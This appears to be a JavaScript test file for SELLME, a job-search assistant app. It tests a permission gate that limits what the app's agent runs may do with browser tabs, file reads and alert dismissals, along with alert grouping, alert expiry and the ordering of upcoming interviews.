  const second = gate({ tool_name: CHROME("tabs_create_mcp"), tool_input: {} }, freshState(), { run: "r", browser });
  assert.equal(second.decision, "deny", "it navigates the tab it has");
  learnFromTool({ tool_name: CHROME("tabs_create_mcp"), tool_input: {}, tool_response: [{ type: "text", text: "Created new tab. Tab ID: 1320382640" }] }, browser);
  assert.deepEqual(browser.opened, ["1320382639", "1320382640"], "if one slips through, it must be closed too");
  learnFromTool({ tool_name: CHROME("tabs_close_mcp"), tool_input: { tabId: 1320382639 }, tool_response: [{ type: "text", text: "Closed tab 1320382639." }] }, browser);
  assert.match(JSON.parse(stopReply(browser)).reason, /1320382640/);
});

test("alerts read as decisions: grouped by what happened, with who and when, and SELLME's bookkeeping isn't one", () => {
  const s = freshState();
  core.addAgent(s, "Dex", { channel: "mcp" });
  core.addRecruiter(s, "Sam Rivera", { handle: "sam@example.com" });
  const now = Date.now();
  s.alerts.push(
    { id: "a1", agent: "Dex", text: "Possible double submission: Dex is now submitting you to Acme, and Sam already did.", ts: new Date(now - 3 * 3600_000).toISOString() },
    { id: "a2", agent: "Sam Rivera", text: "Sam Rivera: Possible double submission. Sam named Acme too.", ts: new Date(now - 2 * 3600_000).toISOString() },
    { id: "a3", agent: "Dex", text: "Calendar clash Fri Nov 13: your 3 PM call overlaps the Acme screen.", ts: new Date(now - 30 * 60_000).toISOString() },
    { id: "a4", agent: "Dex", text: "q109 (nudge to Dex) was auto-approved by the helper and sent by the app.", ts: new Date(now - 60_000).toISOString() },
  );
  const rows = alertRows(s, now);
  assert.equal(rows[0].heading, "Needs your eyes · 3");
  const groups = rows.filter((r) => r.alertGroup);
  assert.deepEqual(groups.map((r) => [r.headline, r.count, r.who]), [["Calendar clash Fri Nov 13", 1, "Dex"], ["Possible double submission", 2, "Dex, Sam Rivera"]]);
  assert.ok(activityRows(s).some((r) => r.history && /q109/.test(r.text ?? "")), "bookkeeping reads as history");
  assert.equal(core.alertBody(s.alerts[1]), "Sam named Acme too.");
  const line = alertLine(groups[1], " ", palette("truecolor"), 100).replace(/\x1b\[[0-9;]*m/g, "");
  assert.match(line, /! Possible double submission \(2\)\s+Dex, Sam Rivera · 2h ago$/);
  assert.ok(line.length <= 100);
  // A run's bookkeeping goes to Activity as a note, not an alert.
  const filed = core.addAlert(s, "Dex", "Duplicate in outbox: q62 is already sent as q61.");
  assert.equal(filed.note, true);
  assert.equal(s.alerts.length, 4);
  assert.equal(core.addAlert(s, "Dex", "Dex offered $987K. Don't reply until you decide.", "Offer from Dex").title, "Offer from Dex");
});

test("a run can read its own saved tool output and close LinkedIn's session, and nothing more", () => withSandbox(async () => {
  const { home } = await import("../lib/store.js");
  const projects = path.join(process.env.CLAUDE_CONFIG_DIR ?? path.join(os.homedir(), ".claude"), "projects");
  const mine = path.join(projects, home().replace(/[^A-Za-z0-9]/g, "-"), "abc", "tool-results", "b1.txt");
  const read = (file_path) => gate({ tool_name: "Read", tool_input: { file_path } }, load(), { run: "r1" }).decision;
  assert.equal(read(mine), "allow", "a big brief is saved there, and the run has to read the rest");
  assert.equal(read(path.join(projects, "-Users-someone-else", "abc", "tool-results", "b1.txt")), "deny");
  assert.equal(read(path.join(projects, home().replace(/[^A-Za-z0-9]/g, "-"), "abc.jsonl")), "deny", "only tool output, not transcripts");
  assert.equal(gate({ tool_name: "mcp__linkedin__close_session", tool_input: {} }, load(), { run: "r1" }).decision, "allow");
}));

test("a call that's going on stays first, with its brief, until it ends", async () => {
  const { preppable } = await import("../lib/prep.js");
  const { span } = await import("../lib/insights.js");
  const { ago } = await import("../lib/render.js");
  const s = state();
  s.roles = [];
  const role = core.addRole(s, { company: "Northwind", stage: "talking", nextCall: "2026-11-13T16:15:00Z" });
  core.addRole(s, { company: "Later Inc", stage: "interview", nextCall: "2026-11-14T16:00:00Z" });
  const during = new Date("2026-11-13T16:34:00Z");
  const rows = pipelineRows(s, during);
  assert.deepEqual(rows.slice(0, 3).map((r) => r.heading ?? r.text), ["Next round (2)", "Northwind", "Later Inc"]);
  assert.equal(rows[1].soon, "Call on now");
  assert.ok(preppable(role, during), "the brief stays open during the call");
  const after = new Date("2026-11-13T17:20:00Z");
  assert.equal(pipelineRows(s, after)[0].heading, "Next round (1)", "an hour on, it's over");
  assert.equal(preppable(role, after), false);
  assert.deepEqual([span(23 * 3600_000), span(24 * 3600_000), span(47 * 3600_000), span(49 * 3600_000)], ["23h", "1d", "1d", "2d"]);
  assert.deepEqual([ago(5 * 3600_000), ago(30 * 3600_000), ago(50 * 3600_000)], ["5h ago", "1d ago", "2d ago"]);
});

test("an alert whose time is over clears itself, and a check can clear one only saying why", () => {
  const s = state();
  const clash = core.addAlert(s, null, "Calendar clash Fri Nov 13: your 3 PM call overlaps the Acme screen.", null, "2026-11-13T21:00:00Z");
  const offer = core.addAlert(s, null, "Northwind offered $987K.", "Offer from Northwind");
  assert.equal(core.expireAlerts(s, new Date("2026-11-13T12:00:00Z")), 0, "not over yet");
  assert.equal(core.expireAlerts(s, new Date("2026-11-14T09:00:00Z")), 1);
  assert.deepEqual(s.alerts.map((a) => a.id), [offer.id], "an alert with no end stays");
  assert.match(s.notes.at(-1).text, /Cleared “Calendar clash Fri Nov 13”: its time has passed/);
  assert.ok(!s.alerts.some((a) => a.id === clash.id));
  assert.equal(gate({ tool_name: "Bash", tool_input: { command: `sellme dismiss ${offer.id}` } }, s, { run: "r" }).decision, "deny");
  assert.equal(gate({ tool_name: "Bash", tool_input: { command: `sellme dismiss ${offer.id} --reason "Resolved: Sam withdrew"` } }, s, { run: "r" }).decision, "allow");
  assert.doesNotMatch(footerLine("Inbox", 200), /r check now/);
  assert.match(footerLine("Pipeline", 200), /r check now/);
});
